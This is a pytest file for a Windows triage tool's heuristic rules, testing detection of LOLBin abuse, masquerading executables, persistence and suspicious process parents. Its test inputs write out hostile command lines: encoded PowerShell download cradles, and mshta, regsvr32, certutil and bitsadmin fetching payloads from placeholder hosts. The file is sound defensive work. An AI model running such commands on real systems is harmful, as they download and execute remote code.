"""Reglas heurísticas: positivos, negativos y falsos positivos conocidos (plan §5)."""

from datetime import datetime, timedelta

import pytest

from win11_triage.models import Finding, Signal, Status
from win11_triage.rules import apply_rules, apply_vt
from win11_triage.rules import heuristics as h

B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"


def F(path="", source="autoruns", cmdline="", category="", name="x", signed_ok=False, signature="", **kw):
    return Finding(source, name, path, "", signature, "", category=category, signed_ok=signed_ok, cmdline=cmdline, **kw)


def ids(signals):
    return {s.id for s in signals}


# ------------------------------------------------------------------ LOLBins
@pytest.mark.parametrize(
    ("cmd", "expected"),
    [
        (f"powershell.exe -nop -enc {B64}", "CMD_PS_ENCODED"),
        (f"powershell -EncodedCommand {B64}", "CMD_PS_ENCODED"),
        ("powershell -c (New-Object Net.WebClient).DownloadString('http://x')", "CMD_PS_DOWNLOAD"),
        ("powershell.exe -WindowStyle Hidden -File a.ps1", "CMD_PS_HIDDEN"),
        ('mshta.exe "https://x.invalid/a.hta"', "CMD_MSHTA_REMOTE"),
        ('mshta vbscript:Execute("x")', "CMD_MSHTA_REMOTE"),
        ("regsvr32 /s /n /u /i:http://x.invalid/a.sct scrobj.dll", "CMD_REGSVR32_SCT"),
        ('rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"', "CMD_RUNDLL32_ABUSE"),
        ("certutil -urlcache -split -f http://x.invalid/a.exe a.exe", "CMD_CERTUTIL"),
        ("certutil -decode in.b64 out.exe", "CMD_CERTUTIL"),
        ("bitsadmin /transfer j http://x.invalid/a a", "CMD_BITSADMIN"),
        ("wscript.exe C:\\Users\\u\\AppData\\a.js", "CMD_WSH_SCRIPT"),
        ("cmd.exe /c powershell -c whoami", "CMD_CMD_CHAIN"),
    ],
)
def test_lolbin_patterns(cmd, expected):
    assert expected in ids(h.lolbin_cmdline(F(cmdline=cmd)))


@pytest.mark.parametrize(
    "cmd",
    [
        "powershell.exe -File C:\\Scripts\\backup.ps1",
        "C:\\Windows\\System32\\mshta.exe C:\\local\\app.hta",
        "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        "certutil -hashfile a.exe SHA256",
        '"C:\\Users\\u\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
    ],
)
def test_lolbin_benign_commands_do_not_fire(cmd):
    assert not list(h.lolbin_cmdline(F(cmdline=cmd)))


# ------------------------------------------------------------------ rutas y nombres
def test_user_writable_paths():
    assert ids(h.user_writable_path(F("C:\\Users\\a\\AppData\\Roaming\\x.exe"))) == {"PATH_USER_WRITABLE"}
    assert ids(h.user_writable_path(F("C:\\ProgramData\\x\\y.exe"))) == {"PATH_USER_WRITABLE"}
    assert not list(h.user_writable_path(F("C:\\Program Files\\App\\app.exe")))


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("C:\\Users\\a\\AppData\\Local\\svchost.exe", "MASQ_SYSTEM_NAME"),
        ("C:\\Users\\a\\AppData\\Local\\scvhost.exe", "MASQ_TYPOSQUAT"),
        ("C:\\Users\\a\\Downloads\\factura.pdf.exe", "MASQ_DOUBLE_EXT"),
    ],
)
def test_masquerading_positive(path, expected):
    assert ids(h.masquerading(F(path))) == {expected}


@pytest.mark.parametrize(
    "path",
    [
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Windows\\SysWOW64\\rundll32.exe",
        "C:\\Windows\\System32\\sihost.exe",  # legítimo y parecido a svchost
        "C:\\Windows\\System32\\taskhost.exe",
        "C:\\Users\\a\\report.pdf",  # no ejecutable
    ],
)
def test_masquerading_negative(path):
    assert not list(h.masquerading(F(path)))


# ------------------------------------------------------------------ persistencia y firma
def test_signed_lolbin_in_persistence_is_not_trusted():
    f = F(
        "c:\\windows\\system32\\mshta.exe", cmdline='mshta "https://x.invalid/a.hta"', category="Logon", signed_ok=True
    )
    apply_rules([f])
    got = ids(f.signals)
    assert "SIG_TRUSTED" not in got
    assert {"CMD_MSHTA_REMOTE", "PERSIST_LOLBIN", "PERSIST_LOGON"} <= got
    assert f.status is Status.DETECTED


def test_sticky_keys_backdoor():
    f = F("c:\\windows\\system32\\cmd.exe", category="Image Hijacks", name="sethc.exe", signed_ok=True)
    apply_rules([f])
    assert "PERSIST_ACCESSIBILITY_BACKDOOR" in ids(f.signals)
    assert f.status is Status.DETECTED


def test_signed_third_party_in_appdata_stays_clean():
    """Teams/Zoom/Discord viven en AppData firmados: no deben salir en rojo ni amarillo."""
    f = F("C:\\Users\\a\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe", category="Logon", signed_ok=True)
    apply_rules([f])
    assert f.score < 30
    assert f.status is Status.CLEAN


def test_unsigned_alone_is_only_yellow():
    f = F("C:\\Tools\\tool.exe", source="sigcheck", signature="Unsigned")
    apply_rules([f])
    assert f.status is Status.UNKNOWN and f.score < 30


def test_missing_file_persistence():
    f = F("File not found: C:\\x\\gone.exe", category="Services")
    assert "PERSIST_FILE_MISSING" in ids(h.persistence_category(f))


def test_recent_file_only_for_files():
    now = datetime(2026, 11, 22, 12, 0)
    recent = (now - timedelta(days=2)).isoformat()
    assert ids(h.recent_file(F(source="sigcheck", created=recent), now)) == {"FILE_RECENT"}
    assert not list(h.recent_file(F(source="sigcheck", created=(now - timedelta(days=30)).isoformat()), now))
    assert not list(h.recent_file(F(source="process", created=recent), now))


# ------------------------------------------------------------------ procesos
def test_office_spawning_shell():
    f = F("C:\\Windows\\System32\\cmd.exe", source="process", parent="winword.exe")
    assert "PROC_OFFICE_SPAWNS_SHELL" in ids(h.process_lineage(f))


def test_unexpected_parent_for_lsass():
    f = F("C:\\Windows\\System32\\lsass.exe", source="process", parent="explorer.exe")
    assert "PROC_UNEXPECTED_PARENT" in ids(h.process_lineage(f))
    ok = F("C:\\Windows\\System32\\lsass.exe", source="process", parent="wininit.exe")
    assert not list(h.process_lineage(ok))


# ------------------------------------------------------------------ puntuación y veredicto
def test_score_dedupes_and_clamps():
    f = F()
    f.signals = [Signal("A", "", 60), Signal("A", "", 40), Signal("B", "", 70), Signal("C", "", -15)]
    assert [s.id for s in f.unique_signals] == ["B", "A", "C"]
    assert f.score == 100


@pytest.mark.parametrize(
    ("weights", "vt", "signed", "status"),
    [
        ([70], None, False, Status.DETECTED),
        ([69], None, False, Status.UNKNOWN),
        ([30], None, True, Status.UNKNOWN),
        ([10], None, False, Status.UNKNOWN),
        ([10], None, True, Status.CLEAN),
        ([10], {"found": True, "malicious": 0}, False, Status.CLEAN),
        ([0], {"found": True, "malicious": 1}, True, Status.DETECTED),
    ],
)
def test_verdict_thresholds(weights, vt, signed, status):
    f = F(signed_ok=signed, vt=vt)
    f.signals = [Signal(f"S{i}", "", w) for i, w in enumerate(weights)]
    assert f.status is status


def test_vt_signals_replace_previous():
    f = F(vt={"found": True, "malicious": 3, "total": 70, "label": "trojan.x"})
    apply_vt([f])
    apply_vt([f])
    assert [s.id for s in f.signals] == ["VT_DETECTED"]
    assert "trojan.x" in f.signals[0].evidence


def test_attack_ids_are_known():
    from win11_triage.rules.attack import technique_name

    for *_rest, attack, _w in h.LOLBIN_PATTERNS:
        assert technique_name(attack), attack


def test_service_event_running_lolbin_is_red():
    f = F(
        "C:\\Windows\\System32\\cmd.exe",
        source="event",
        category="Servicio instalado (7045)",
        cmdline=f"%COMSPEC% /c powershell -w hidden -enc {B64}",
    )
    f.add(Signal("EVT_SERVICE_INSTALLED", "", 10, "T1543.003"))
    apply_rules([f])
    assert "PERSIST_LOLBIN" in ids(f.signals)
    assert f.status is Status.DETECTED
